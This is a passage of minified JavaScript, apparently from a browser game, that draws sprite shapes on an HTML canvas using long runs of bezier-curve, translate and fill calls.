                    r.bezierCurveTo(352.048583984375 * e, 145.6805419921875 * e, 292.048583984375 * e, 86.6805419921875 * e, 223.048583984375 * e, 74.6805419921875 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 6 * e),
                    r.save(),
                    r.translate(183.548583984375 * e, 119.6805419921875 * e),
                    Ve(r, -121.5 * e, -45 * e, 243 * e, 90 * e, 40 * e),
                    r.restore(),
                    he(r, i[0], i[0], 6 * e),
                    r.save(),
                    r.translate(183.048583984375 * e, 155.6805419921875 * e),
                    Ve(r, -121 * e, -52 * e, 242 * e, 104 * e, 40 * e),
                    r.restore(),
                    he(r, i[0], i[0], 6 * e),
                    r.save(),
                    r.translate(183.048583984375 * e, 205.1805419921875 * e),
                    Ve(r, -121 * e, -50.5 * e, 242 * e, 101 * e, 40 * e),
                    r.restore(),
                    he(r, i[0], i[0], 6 * e),
                    r.save(),
                    r.translate(185.048583984375 * e, 204.1805419921875 * e),
                    Ve(r, -100 * e, -34.5 * e, 200 * e, 69 * e, 40 * e),
                    r.restore(),
                    he(r, i[0], i[0], 6 * e),
                    ke(r, 185.048583984375 * e, 257.6805419921875 * e, 27.018512172212592 * e),
                    he(r, i[0], i[0], 6 * e),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(224.048583984375 * e, 56.6805419921875 * e),
                    r.bezierCurveTo(326.048583984375 * e, 69.6805419921875 * e, 363.048583984375 * e, 148.6805419921875 * e, 349.048583984375 * e, 206.6805419921875 * e),
                    r.bezierCurveTo(329.048583984375 * e, 278.6805419921875 * e, 252.048583984375 * e, 283.6805419921875 * e, 206.048583984375 * e, 275.6805419921875 * e),
                    r.bezierCurveTo(206.548583984375 * e, 266.6805419921875 * e, 206.548583984375 * e, 266.6805419921875 * e, 207.048583984375 * e, 257.6805419921875 * e),
                    r.bezierCurveTo(276.048583984375 * e, 268.6805419921875 * e, 308.048583984375 * e, 239.6805419921875 * e, 323.048583984375 * e, 208.6805419921875 * e),
                    r.bezierCurveTo(352.048583984375 * e, 145.6805419921875 * e, 292.048583984375 * e, 86.6805419921875 * e, 223.048583984375 * e, 74.6805419921875 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.save(),
                    r.translate(184.048583984375 * e, 69.1805419921875 * e),
                    Ve(r, -40 * e, -28.5 * e, 80 * e, 57 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(185.048583984375 * e, 61.6805419921875 * e),
                    r.bezierCurveTo(145.048583984375 * e, 59.6805419921875 * e, 138.048583984375 * e, 41.6805419921875 * e, 148.048583984375 * e, 33.6805419921875 * e),
                    r.bezierCurveTo(169.048583984375 * e, 17.6805419921875 * e, 194.048583984375 * e, 20.6805419921875 * e, 210.048583984375 * e, 27.6805419921875 * e),
                    r.bezierCurveTo(234.048583984375 * e, 40.6805419921875 * e, 225.048583984375 * e, 57.6805419921875 * e, 186.048583984375 * e, 61.6805419921875 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 6 * e),
                    r.save(),
                    r.translate(183.548583984375 * e, 119.6805419921875 * e),
                    Ve(r, -121.5 * e, -45 * e, 243 * e, 90 * e, 40 * e),
                    r.restore(),
                    he(r, i[5], i[4], 6 * e),
                    r.save(),
                    r.translate(183.048583984375 * e, 155.6805419921875 * e),
                    Ve(r, -121 * e, -52 * e, 242 * e, 104 * e, 40 * e),
                    r.restore(),
                    he(r, i[3], i[4], 6 * e),
                    r.save(),
                    r.translate(183.048583984375 * e, 205.1805419921875 * e),
                    Ve(r, -121 * e, -50.5 * e, 242 * e, 101 * e, 40 * e),
                    r.restore(),
                    he(r, i[6], i[4], 6 * e),
                    r.globalCompositeOperation = "destination-out",
                    r.save(),
                    r.translate(185.048583984375 * e, 204.1805419921875 * e),
                    Ve(r, -100 * e, -34.5 * e, 200 * e, 69 * e, 40 * e),
                    r.restore(),
                    he(r, i[7], i[8], 6 * e),
                    r.globalCompositeOperation = "source-over",
                    r.globalAlpha = .5,
                    r.save(),
                    r.translate(185.048583984375 * e, 204.1805419921875 * e),
                    Ve(r, -100 * e, -34.5 * e, 200 * e, 69 * e, 40 * e),
                    r.restore(),
                    he(r, i[7], i[8], 6 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    ke(r, 185.048583984375 * e, 257.6805419921875 * e, 27.018512172212592 * e),
                    he(r, i[3], i[4], 6 * e),
                    r.restore(),
                    n
            }
            function bt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 220 * e,
                    n.height = 180 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(-90 * e, -150 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(104 * e, 237.8000030517578 * e),
                    r.bezierCurveTo(110 * e, 237.8000030517578 * e, 110 * e, 237.8000030517578 * e, 116 * e, 237.8000030517578 * e),
                    r.bezierCurveTo(116 * e, 241.8000030517578 * e, 116 * e, 241.8000030517578 * e, 116 * e, 245.8000030517578 * e),
                    r.bezierCurveTo(115 * e, 245.3000030517578 * e, 115 * e, 245.3000030517578 * e, 114 * e, 244.8000030517578 * e),
                    r.bezierCurveTo(109.5 * e, 244.8000030517578 * e, 109.5 * e, 244.8000030517578 * e, 105 * e, 244.8000030517578 * e),
                    r.closePath(),
                    he(r, i[5], i[5], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 211.20000457763672 * e),
                    r.bezierCurveTo(106 * e, 216.20000457763672 * e, 101 * e, 234.20000457763672 * e, 102 * e, 241.20000457763672 * e),
                    r.bezierCurveTo(102 * e, 260.2000045776367 * e, 115 * e, 269.2000045776367 * e, 115 * e, 269.2000045776367 * e),
                    r.bezierCurveTo(116 * e, 265.2000045776367 * e, 115.5 * e, 265.2000045776367 * e, 116 * e, 261.2000045776367 * e),
                    r.bezierCurveTo(112 * e, 264 * e, 108 * e, 254 * e, 106 * e, 242 * e),
                    r.bezierCurveTo(105 * e, 232 * e, 110 * e, 222 * e, 115 * e, 218 * e),
                    r.bezierCurveTo(116 * e, 216.75 * e, 115.5 * e, 217.375 * e, 116 * e, 216.75 * e),
                    r.closePath(),
                    he(r, i[5], i[5], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(120 * e, 207 * e),
                    r.bezierCurveTo(115 * e, 206 * e, 114 * e, 209 * e, 114 * e, 211 * e),
                    r.bezierCurveTo(114 * e, 268 * e, 114 * e, 241 * e, 114 * e, 271 * e),
                    r.bezierCurveTo(115 * e, 276 * e, 118 * e, 276 * e, 120 * e, 276 * e),
                    r.bezierCurveTo(122 * e, 273 * e, 120.5 * e, 274.5 * e, 121 * e, 273 * e),
                    r.bezierCurveTo(121 * e, 241 * e, 121 * e, 241 * e, 121 * e, 209 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(284 * e, 238 * e),
                    r.bezierCurveTo(289.5 * e, 238 * e, 289.5 * e, 238 * e, 295 * e, 238 * e),
                    r.bezierCurveTo(295 * e, 241.5 * e, 295 * e, 241.5 * e, 295 * e, 245 * e),
                    r.bezierCurveTo(289.5 * e, 245 * e, 289.5 * e, 245 * e, 284 * e, 245 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(283 * e, 211 * e),
                    r.bezierCurveTo(293 * e, 216 * e, 297 * e, 231 * e, 297 * e, 241 * e),
                    r.bezierCurveTo(298 * e, 254 * e, 290 * e, 265 * e, 284 * e, 269 * e),
                    r.bezierCurveTo(283 * e, 266 * e, 283.5 * e, 266 * e, 283 * e, 263 * e),
                    r.bezierCurveTo(290 * e, 260 * e, 292 * e, 251 * e, 293 * e, 242 * e),
                    r.bezierCurveTo(292 * e, 223 * e, 289 * e, 224 * e, 284 * e, 218 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(280 * e, 206 * e),
                    r.bezierCurveTo(284 * e, 206 * e, 285 * e, 208 * e, 285 * e, 211 * e),
                    r.bezierCurveTo(285 * e, 241.5 * e, 285 * e, 241.5 * e, 285 * e, 272 * e),
                    r.bezierCurveTo(284 * e, 275 * e, 284 * e, 275 * e, 280 * e, 275 * e),
                    r.bezierCurveTo(279 * e, 273.5 * e, 279 * e, 273.5 * e, 278 * e, 272 * e),
                    r.bezierCurveTo(278 * e, 240.5 * e, 278 * e, 240.5 * e, 278 * e, 209 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(138 * e, 298.40000915527344 * e),
                    r.bezierCurveTo(141 * e, 311.40000915527344 * e, 151 * e, 314.40000915527344 * e, 162 * e, 316.40000915527344 * e),
                    r.bezierCurveTo(224 * e, 316.40000915527344 * e, 200 * e, 315.90000915527344 * e, 238 * e, 315.40000915527344 * e),
                    r.bezierCurveTo(254 * e, 316.40000915527344 * e, 261 * e, 306.40000915527344 * e, 264 * e, 298.40000915527344 * e),
                    r.bezierCurveTo(255 * e, 304.40000915527344 * e, 250 * e, 306.40000915527344 * e, 244 * e, 306.40000915527344 * e),
                    r.bezierCurveTo(201 * e, 306.90000915527344 * e, 201 * e, 306.90000915527344 * e, 158 * e, 307.40000915527344 * e),
                    r.bezierCurveTo(150 * e, 306.40000915527344 * e, 148 * e, 306.40000915527344 * e, 139 * e, 300.40000915527344 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(161 * e, 177.5999984741211 * e),
                    r.bezierCurveTo(130 * e, 175.5999984741211 * e, 123 * e, 190.5999984741211 * e, 122 * e, 205.5999984741211 * e),
                    r.bezierCurveTo(121 * e, 277.5999984741211 * e, 122 * e, 242.5999984741211 * e, 122 * e, 279.5999984741211 * e),
                    r.bezierCurveTo(128 * e, 297.5999984741211 * e, 137 * e, 299.5999984741211 * e, 143 * e, 300.5999984741211 * e),
                    r.bezierCurveTo(163 * e, 301.0999984741211 * e, 163 * e, 301.0999984741211 * e, 183 * e, 301.5999984741211 * e),
                    r.bezierCurveTo(150 * e, 300.5999984741211 * e, 135 * e, 290.5999984741211 * e, 134 * e, 267.5999984741211 * e),
                    r.bezierCurveTo(133 * e, 245.5999984741211 * e, 146 * e, 235.5999984741211 * e, 164 * e, 235.5999984741211 * e),
                    r.bezierCurveTo(206 * e, 236.0999984741211 * e, 206 * e, 236.0999984741211 * e, 248 * e, 236.5999984741211 * e),
                    r.bezierCurveTo(266 * e, 243.5999984741211 * e, 268 * e, 259.5999984741211 * e, 267 * e, 266.5999984741211 * e),
                    r.bezierCurveTo(266 * e, 288.5999984741211 * e, 251 * e, 294.5999984741211 * e, 244 * e, 297.5999984741211 * e),
                    r.bezierCurveTo(228.5 * e, 299.5999984741211 * e, 228.5 * e, 299.5999984741211 * e, 213 * e, 301.5999984741211 * e),
                    r.bezierCurveTo(236 * e, 301.0999984741211 * e, 236 * e, 301.0999984741211 * e, 259 * e, 300.5999984741211 * e),
                    r.bezierCurveTo(272 * e, 295.5999984741211 * e, 277 * e, 288.5999984741211 * e, 278 * e, 271.5999984741211 * e),
                    r.bezierCurveTo(277.5 * e, 236.5999984741211 * e, 277.5 * e, 236.5999984741211 * e, 277 * e, 201.5999984741211 * e),
                    r.bezierCurveTo(276 * e, 186.5999984741211 * e, 265 * e, 178.5999984741211 * e, 254 * e, 177.5999984741211 * e),
                    r.bezierCurveTo(247.5 * e, 177.5999984741211 * e, 247.5 * e, 177.5999984741211 * e, 241 * e, 177.5999984741211 * e),
                    r.bezierCurveTo(255 * e, 202.5999984741211 * e, 214 * e, 217.5999984741211 * e, 201 * e, 215.5999984741211 * e),
                    r.bezierCurveTo(170 * e, 215.5999984741211 * e, 152 * e, 197.5999984741211 * e, 161 * e, 178.5999984741211 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(162 * e, 175.5999984741211 * e),
                    r.bezierCurveTo(153 * e, 176.0999984741211 * e, 153 * e, 176.0999984741211 * e, 144 * e, 176.5999984741211 * e),
                    r.bezierCurveTo(125 * e, 178.5999984741211 * e, 121 * e, 196.5999984741211 * e, 121 * e, 207.5999984741211 * e),
                    r.bezierCurveTo(121 * e, 243.20000076293945 * e, 121 * e, 243.20000076293945 * e, 121 * e, 278.8000030517578 * e),
                    r.bezierCurveTo(126 * e, 298.8000030517578 * e, 137 * e, 300.8000030517578 * e, 146 * e, 302.8000030517578 * e),
                    r.bezierCurveTo(200.5 * e, 302.8000030517578 * e, 200.5 * e, 302.8000030517578 * e, 255 * e, 302.8000030517578 * e),
                    r.bezierCurveTo(271 * e, 301.8000030517578 * e, 279 * e, 288.8000030517578 * e, 279 * e, 273.8000030517578 * e),
                    r.bezierCurveTo(279 * e, 236.8000030517578 * e, 279 * e, 236.8000030517578 * e, 279 * e, 199.8000030517578 * e),
                    r.bezierCurveTo(274 * e, 178.8000030517578 * e, 263 * e, 177.8000030517578 * e, 255 * e, 175.8000030517578 * e),
                    r.bezierCurveTo(248 * e, 175.8000030517578 * e, 248 * e, 175.8000030517578 * e, 241 * e, 175.8000030517578 * e),
                    r.bezierCurveTo(240 * e, 175.8000030517578 * e, 240 * e, 175.8000030517578 * e, 239 * e, 175.8000030517578 * e),
                    r.bezierCurveTo(254 * e, 200.8000030517578 * e, 222 * e, 211.8000030517578 * e, 202 * e, 212.8000030517578 * e),
                    r.bezierCurveTo(168 * e, 213.8000030517578 * e, 151 * e, 190.8000030517578 * e, 163 * e, 176.8000030517578 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(198 * e, 161.4000015258789 * e),
                    r.bezierCurveTo(198 * e, 186.9000015258789 * e, 198 * e, 186.9000015258789 * e, 198 * e, 212.4000015258789 * e),
                    r.bezierCurveTo(201 * e, 212.4000015258789 * e, 201 * e, 212.4000015258789 * e, 204 * e, 212.4000015258789 * e),
                    r.bezierCurveTo(204 * e, 186.9000015258789 * e, 204 * e, 186.9000015258789 * e, 204 * e, 161.4000015258789 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(161 * e, 194 * e),
                    r.bezierCurveTo(188 * e, 169 * e, 231 * e, 179 * e, 241 * e, 194 * e),
                    r.bezierCurveTo(239.5 * e, 196 * e, 239.5 * e, 196 * e, 238 * e, 198 * e),
                    r.bezierCurveTo(221 * e, 179 * e, 182 * e, 182 * e, 165 * e, 198 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(162 * e, 150.80000019073486 * e, 241 * e, 150.80000019073486 * e, 245 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(242 * e, 224.80000019073486 * e, 162 * e, 228.80000019073486 * e, 157 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(159 * e, 188.80000019073486 * e, 159 * e, 188.80000019073486 * e, 161 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(168 * e, 216.80000019073486 * e, 231 * e, 218.80000019073486 * e, 241 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(236 * e, 156.80000019073486 * e, 169 * e, 152.80000019073486 * e, 161 * e, 188.80000019073486 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(156 * e, 188 * e),
                    r.bezierCurveTo(160 * e, 164 * e, 183 * e, 159 * e, 201 * e, 158 * e),
                    r.bezierCurveTo(232 * e, 159 * e, 244 * e, 174 * e, 246 * e, 188 * e),
                    r.bezierCurveTo(245 * e, 212 * e, 213 * e, 219 * e, 201 * e, 218 * e),
                    r.bezierCurveTo(181 * e, 221 * e, 158 * e, 207 * e, 156 * e, 190 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(162 * e, 189 * e),
                    r.bezierCurveTo(166 * e, 170 * e, 185 * e, 165 * e, 201 * e, 164 * e),
                    r.bezierCurveTo(227 * e, 165 * e, 240 * e, 178 * e, 239 * e, 188 * e),
                    r.bezierCurveTo(239 * e, 204 * e, 210 * e, 210 * e, 201 * e, 210 * e),
                    r.bezierCurveTo(182 * e, 211 * e, 166 * e, 200 * e, 162 * e, 190 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(131 * e, 262 * e),
                    r.bezierCurveTo(136 * e, 241 * e, 144 * e, 236 * e, 158 * e, 233 * e),
                    r.bezierCurveTo(200.5 * e, 233 * e, 229 * e, 232 * e, 243 * e, 233 * e),
                    r.bezierCurveTo(259 * e, 235 * e, 267 * e, 248 * e, 269 * e, 260 * e),
                    r.bezierCurveTo(269 * e, 266.5 * e, 269 * e, 266.5 * e, 269 * e, 273 * e),
                    r.bezierCurveTo(265 * e, 290 * e, 251 * e, 297 * e, 242 * e, 298 * e),
                    r.bezierCurveTo(202 * e, 298 * e, 202 * e, 298 * e, 162 * e, 298 * e),
                    r.bezierCurveTo(148 * e, 298 * e, 136 * e, 289 * e, 132 * e, 273 * e),
                    r.bezierCurveTo(131.5 * e, 268 * e, 131.5 * e, 268 * e, 131 * e, 263 * e),
                    r.bezierCurveTo(135 * e, 263 * e, 135 * e, 263 * e, 139 * e, 263 * e),
                    r.bezierCurveTo(139 * e, 281 * e, 151 * e, 287 * e, 160 * e, 290 * e),
                    r.bezierCurveTo(200.5 * e, 290 * e, 200.5 * e, 290 * e, 241 * e, 290 * e),
                    r.bezierCurveTo(252 * e, 290 * e, 257 * e, 281 * e, 262 * e, 271 * e),
                    r.bezierCurveTo(261.5 * e, 267 * e, 261.5 * e, 267 * e, 261 * e, 263 * e),
                    r.bezierCurveTo(260 * e, 249 * e, 251 * e, 242 * e, 241 * e, 241 * e),
                    r.bezierCurveTo(240.5 * e, 240.5 * e, 240.5 * e, 240.5 * e, 240 * e, 240 * e),
                    r.bezierCurveTo(200 * e, 240 * e, 200 * e, 240 * e, 160 * e, 240 * e),
                    r.bezierCurveTo(145 * e, 244 * e, 142 * e, 250 * e, 139 * e, 264 * e),
                    r.closePath(),
                    he(r, i[4], i[4], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(130 * e, 264 * e),
                    r.bezierCurveTo(132 * e, 244 * e, 144 * e, 235 * e, 157 * e, 232 * e),
                    r.bezierCurveTo(245 * e, 232 * e, 201 * e, 232 * e, 245 * e, 232 * e),
                    r.bezierCurveTo(264 * e, 235 * e, 269 * e, 251 * e, 270 * e, 264 * e),
                    r.bezierCurveTo(272 * e, 291 * e, 248 * e, 299 * e, 242 * e, 299 * e),
                    r.bezierCurveTo(200 * e, 299 * e, 200 * e, 299 * e, 158 * e, 299 * e),
                    r.bezierCurveTo(139 * e, 298 * e, 130 * e, 276 * e, 130 * e, 265 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(140 * e, 265.33333587646484 * e),
                    r.bezierCurveTo(141 * e, 250.33333587646484 * e, 148 * e, 244.33333587646484 * e, 160 * e, 241.33333587646484 * e),
                    r.bezierCurveTo(200 * e, 241.33333587646484 * e, 200 * e, 241.33333587646484 * e, 240 * e, 241.33333587646484 * e),
                    r.bezierCurveTo(256 * e, 243.33333587646484 * e, 260 * e, 255.33333587646484 * e, 260 * e, 265.33333587646484 * e),
                    r.bezierCurveTo(261 * e, 281.33333587646484 * e, 247 * e, 289.33333587646484 * e, 240 * e, 289.33333587646484 * e),
                    r.bezierCurveTo(161 * e, 289.33333587646484 * e, 200.5 * e, 289.33333587646484 * e, 161 * e, 289.33333587646484 * e),
                    r.bezierCurveTo(149 * e, 288.33333587646484 * e, 142 * e, 278.33333587646484 * e, 140 * e, 266.33333587646484 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.globalAlpha = .5,
                    r.scale(1, 1),
                    r.translate(105 * e, 155 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(59.27557373046875 * e, 20.406280517578125 * e),
                    r.bezierCurveTo(74.27557373046875 * e, 5.406280517578125 * e, 90.27557373046875 * e, 6.406280517578125 * e, 99.27557373046875 * e, 5.406280517578125 * e),
                    r.bezierCurveTo(120.27557373046875 * e, 5.406280517578125 * e, 126.27557373046875 * e, 10.406280517578125 * e, 136.27557373046875 * e, 20.406280517578125 * e),
                    r.bezierCurveTo(157.77557373046875 * e, 37.906280517578125 * e, 157.77557373046875 * e, 37.906280517578125 * e, 179.27557373046875 * e, 55.406280517578125 * e),
                    r.bezierCurveTo(190.27557373046875 * e, 63.406280517578125 * e, 192.27557373046875 * e, 77.40628051757812 * e, 189.27557373046875 * e, 91.40628051757812 * e),
                    r.bezierCurveTo(183.27557373046875 * e, 108.40628051757812 * e, 176.27557373046875 * e, 110.40628051757812 * e, 169.27557373046875 * e, 118.40628051757812 * e),
                    r.bezierCurveTo(152.27557373046875 * e, 133.40628051757812 * e, 152.27557373046875 * e, 133.40628051757812 * e, 135.27557373046875 * e, 148.40628051757812 * e),
                    r.bezierCurveTo(87.27557373046875 * e, 143.40628051757812 * e, 87.27557373046875 * e, 143.40628051757812 * e, 39.27557373046875 * e, 138.40628051757812 * e),
                    r.bezierCurveTo(26.77557373046875 * e, 123.40628051757812 * e, 26.77557373046875 * e, 123.40628051757812 * e, 14.27557373046875 * e, 108.40628051757812 * e),
                    r.bezierCurveTo(2.27557373046875 * e, 95.40628051757812 * e, 2.27557373046875 * e, 92.40628051757812 * e, 3.27557373046875 * e, 83.40628051757812 * e),
                    r.bezierCurveTo(4.27557373046875 * e, 63.406280517578125 * e, 12.27557373046875 * e, 60.406280517578125 * e, 24.27557373046875 * e, 40.406280517578125 * e),
                    r.closePath(),
                    he(r, i[5], i[5], 4 * e),
                    r.globalAlpha = 1,
                    r.translate(-110 * e, -155 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(104 * e, 237.8000030517578 * e),
                    r.bezierCurveTo(110 * e, 237.8000030517578 * e, 110 * e, 237.8000030517578 * e, 116 * e, 237.8000030517578 * e),
                    r.bezierCurveTo(116 * e, 241.8000030517578 * e, 116 * e, 241.8000030517578 * e, 116 * e, 245.8000030517578 * e),
                    r.bezierCurveTo(115 * e, 245.3000030517578 * e, 115 * e, 245.3000030517578 * e, 114 * e, 244.8000030517578 * e),
                    r.bezierCurveTo(109.5 * e, 244.8000030517578 * e, 109.5 * e, 244.8000030517578 * e, 105 * e, 244.8000030517578 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 211.20000457763672 * e),
                    r.bezierCurveTo(106 * e, 216.20000457763672 * e, 101 * e, 234.20000457763672 * e, 102 * e, 241.20000457763672 * e),
                    r.bezierCurveTo(102 * e, 260.2000045776367 * e, 115 * e, 269.2000045776367 * e, 115 * e, 269.2000045776367 * e),
                    r.bezierCurveTo(116 * e, 265.2000045776367 * e, 115.5 * e, 265.2000045776367 * e, 116 * e, 261.2000045776367 * e),
                    r.bezierCurveTo(112 * e, 264 * e, 108 * e, 254 * e, 106 * e, 242 * e),
                    r.bezierCurveTo(105 * e, 232 * e, 110 * e, 222 * e, 115 * e, 218 * e),
                    r.bezierCurveTo(116 * e, 216.75 * e, 115.5 * e, 217.375 * e, 116 * e, 216.75 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(120 * e, 207 * e),
                    r.bezierCurveTo(115 * e, 206 * e, 114 * e, 209 * e, 114 * e, 211 * e),
                    r.bezierCurveTo(114 * e, 268 * e, 114 * e, 241 * e, 114 * e, 271 * e),
                    r.bezierCurveTo(115 * e, 276 * e, 118 * e, 276 * e, 120 * e, 276 * e),
                    r.bezierCurveTo(122 * e, 273 * e, 120.5 * e, 274.5 * e, 121 * e, 273 * e),
                    r.bezierCurveTo(121 * e, 241 * e, 121 * e, 241 * e, 121 * e, 209 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(284 * e, 238 * e),
                    r.bezierCurveTo(289.5 * e, 238 * e, 289.5 * e, 238 * e, 295 * e, 238 * e),
                    r.bezierCurveTo(295 * e, 241.5 * e, 295 * e, 241.5 * e, 295 * e, 245 * e),
                    r.bezierCurveTo(289.5 * e, 245 * e, 289.5 * e, 245 * e, 284 * e, 245 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(283 * e, 211 * e),
                    r.bezierCurveTo(293 * e, 216 * e, 297 * e, 231 * e, 297 * e, 241 * e),
                    r.bezierCurveTo(298 * e, 254 * e, 290 * e, 265 * e, 284 * e, 269 * e),
                    r.bezierCurveTo(283 * e, 266 * e, 283.5 * e, 266 * e, 283 * e, 263 * e),
                    r.bezierCurveTo(290 * e, 260 * e, 292 * e, 251 * e, 293 * e, 242 * e),
                    r.bezierCurveTo(292 * e, 223 * e, 289 * e, 224 * e, 284 * e, 218 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(280 * e, 206 * e),
                    r.bezierCurveTo(284 * e, 206 * e, 285 * e, 208 * e, 285 * e, 211 * e),
                    r.bezierCurveTo(285 * e, 241.5 * e, 285 * e, 241.5 * e, 285 * e, 272 * e),
                    r.bezierCurveTo(284 * e, 275 * e, 284 * e, 275 * e, 280 * e, 275 * e),
                    r.bezierCurveTo(279 * e, 273.5 * e, 279 * e, 273.5 * e, 278 * e, 272 * e),
                    r.bezierCurveTo(278 * e, 240.5 * e, 278 * e, 240.5 * e, 278 * e, 209 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(138 * e, 298.40000915527344 * e),
                    r.bezierCurveTo(141 * e, 311.40000915527344 * e, 151 * e, 314.40000915527344 * e, 162 * e, 316.40000915527344 * e),
                    r.bezierCurveTo(224 * e, 316.40000915527344 * e, 200 * e, 315.90000915527344 * e, 238 * e, 315.40000915527344 * e),
                    r.bezierCurveTo(254 * e, 316.40000915527344 * e, 261 * e, 306.40000915527344 * e, 264 * e, 298.40000915527344 * e),
                    r.bezierCurveTo(255 * e, 304.40000915527344 * e, 250 * e, 306.40000915527344 * e, 244 * e, 306.40000915527344 * e),
                    r.bezierCurveTo(201 * e, 306.90000915527344 * e, 201 * e, 306.90000915527344 * e, 158 * e, 307.40000915527344 * e),
                    r.bezierCurveTo(150 * e, 306.40000915527344 * e, 148 * e, 306.40000915527344 * e, 139 * e, 300.40000915527344 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(161 * e, 177.5999984741211 * e),
                    r.bezierCurveTo(130 * e, 175.5999984741211 * e, 123 * e, 190.5999984741211 * e, 122 * e, 205.5999984741211 * e),
                    r.bezierCurveTo(121 * e, 277.5999984741211 * e, 122 * e, 242.5999984741211 * e, 122 * e, 279.5999984741211 * e),
                    r.bezierCurveTo(128 * e, 297.5999984741211 * e, 137 * e, 299.5999984741211 * e, 143 * e, 300.5999984741211 * e),
                    r.bezierCurveTo(163 * e, 301.0999984741211 * e, 163 * e, 301.0999984741211 * e, 183 * e, 301.5999984741211 * e),
                    r.bezierCurveTo(150 * e, 300.5999984741211 * e, 135 * e, 290.5999984741211 * e, 134 * e, 267.5999984741211 * e),
                    r.bezierCurveTo(133 * e, 245.5999984741211 * e, 146 * e, 235.5999984741211 * e, 164 * e, 235.5999984741211 * e),
                    r.bezierCurveTo(206 * e, 236.0999984741211 * e, 206 * e, 236.0999984741211 * e, 248 * e, 236.5999984741211 * e),
                    r.bezierCurveTo(266 * e, 243.5999984741211 * e, 268 * e, 259.5999984741211 * e, 267 * e, 266.5999984741211 * e),
                    r.bezierCurveTo(266 * e, 288.5999984741211 * e, 251 * e, 294.5999984741211 * e, 244 * e, 297.5999984741211 * e),
                    r.bezierCurveTo(228.5 * e, 299.5999984741211 * e, 228.5 * e, 299.5999984741211 * e, 213 * e, 301.5999984741211 * e),
                    r.bezierCurveTo(236 * e, 301.0999984741211 * e, 236 * e, 301.0999984741211 * e, 259 * e, 300.5999984741211 * e),
